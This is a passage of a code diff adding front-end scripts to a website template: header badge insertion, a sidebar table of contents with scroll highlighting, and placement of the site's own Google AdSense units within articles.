+          metaEl.insertAdjacentHTML('beforeend', ' &middot; ' + badge);
+        } else {
+          var h1 = header.querySelector('h1');
+          if (h1) {
+            var div = document.createElement('div');
+            div.className = 'article-hero-meta';
+            div.innerHTML = badge;
+            header.appendChild(div);
+          }
+        }
+      })();
+    </script>
+
+    <!-- BR2: Sidebar Table of Contents — IntersectionObserver highlight -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        // Build the ToC from headings/sections inside article
+        function buildSidebarToC() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          // Collect anchor targets + labels.
+          // Support two patterns:
+          //   (a) <h2 id="..."> / <h3 id="..."> — explicit IDs on headings
+          //   (b) <section id="..."><h2>...</h2> — IDs on parent sections (older articles)
+          var entries = [];
+
+          // Pass (a): headings with own IDs
+          article.querySelectorAll('h2[id], h3[id]').forEach(function(h) {
+            entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+          });
+
+          // Pass (b): sections with IDs whose h2 has no id yet
+          if (entries.length < 3) {
+            entries = [];
+            article.querySelectorAll('section[id]').forEach(function(sec) {
+              var h = sec.querySelector('h2, h3');
+              if (!h) return;
+              // Ensure heading has the id so IntersectionObserver works
+              if (!h.id) h.id = sec.id;
+              entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+            });
+          }
+
+          if (entries.length < 3) return; // not worth showing
+
+          // Add has-toc-sidebar class to main
+          var mainEl = document.querySelector('main');
+          if (mainEl) mainEl.classList.add('has-toc-sidebar');
+
+          // Build sidebar element
+          var sidebar = document.createElement('nav');
+          sidebar.className = 'toc-sidebar';
+          sidebar.setAttribute('aria-label', 'Table of contents');
+
+          var header = document.createElement('div');
+          header.className = 'toc-sidebar-header';
+          header.textContent = 'In this article';
+          sidebar.appendChild(header);
+
+          var list = document.createElement('ul');
+          list.className = 'toc-sidebar-list';
+
+          entries.forEach(function(e) {
+            var li = document.createElement('li');
+            li.className = 'toc-sidebar-item' + (e.level === 'H3' ? ' toc-sidebar-item--sub' : '');
+            li.setAttribute('data-heading-id', e.id);
+
+            var a = document.createElement('a');
+            a.href = '#' + e.id;
+            a.textContent = e.text.replace(/^[0-9]+\.\s*/, ''); // strip leading "1. "
+            li.appendChild(a);
+            list.appendChild(li);
+          });
+
+          sidebar.appendChild(list);
+
+          // Append sidebar to main (grid places it to the right)
+          if (mainEl) mainEl.appendChild(sidebar);
+
+          // IntersectionObserver — highlight active heading
+          var items = sidebar.querySelectorAll('.toc-sidebar-item[data-heading-id]');
+          var activeId = null;
+
+          var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+              if (entry.isIntersecting) {
+                activeId = entry.target.id;
+              }
+            });
+
+            items.forEach(function(item) {
+              item.classList.toggle(
+                'toc-sidebar-item--active',
+                item.getAttribute('data-heading-id') === activeId
+              );
+            });
+          }, {
+            rootMargin: '-20% 0px -75% 0px',
+            threshold: 0
+          });
+
+          entries.forEach(function(e) { observer.observe(e.el); });
+
+          // Smooth scroll for sidebar links
+          sidebar.addEventListener('click', function(e) {
+            var a = e.target.closest('a');
+            if (!a) return;
+            var id = a.getAttribute('href').replace('#', '');
+            var target = document.getElementById(id);
+            if (target) {
+              e.preventDefault();
+              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+              history.replaceState(null, '', '#' + id);
+            }
+          });
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', buildSidebarToC);
+        } else {
+          buildSidebarToC();
+        }
+      })();
+    </script>
+
+    <!-- ME3: Inline ad injection — inserts 2 ads per article (post-intro + mid-article) -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        var pubId  = 'ca-pub-9373816755142401';
+        var slotId = '9879569728';
+        if (!pubId || !slotId) return;
+
+        function createAdUnit(label) {
+          var wrapper = document.createElement('div');
+          wrapper.className = 'ad-container ad-inline';
+          wrapper.setAttribute('data-ad-label', label);
+          wrapper.innerHTML =
+            '<ins class="adsbygoogle"' +
+            ' style="display:block"' +
+            ' data-ad-client="' + pubId + '"' +
+            ' data-ad-slot="' + slotId + '"' +
+            ' data-ad-format="auto"' +
+            ' data-full-width-responsive="true"></ins>';
+          return wrapper;
+        }
+
+        function injectAds() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          var allP = article.querySelectorAll('p');
+          if (allP.length < 6) return;
+
+          // Ad 1: after paragraph 3 (post-intro)
+          var introTarget = allP[2];
+          if (introTarget && introTarget.parentNode) {
+            var ad1 = createAdUnit('post-intro');
+            introTarget.parentNode.insertBefore(ad1, introTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+
+          // Re-query after first insertion, place mid-article ad
+          allP = article.querySelectorAll('p');
+          var midIdx = Math.floor(allP.length / 2);
+          if (midIdx < 6) midIdx = 6;
+          var midTarget = allP[midIdx];
+          if (midTarget && midTarget.parentNode) {
+            var ad2 = createAdUnit('mid-article');
+            midTarget.parentNode.insertBefore(ad2, midTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', injectAds);
+        } else {
+          injectAds();
+        }
+      })();
+    </script>
+</body>
+</html>
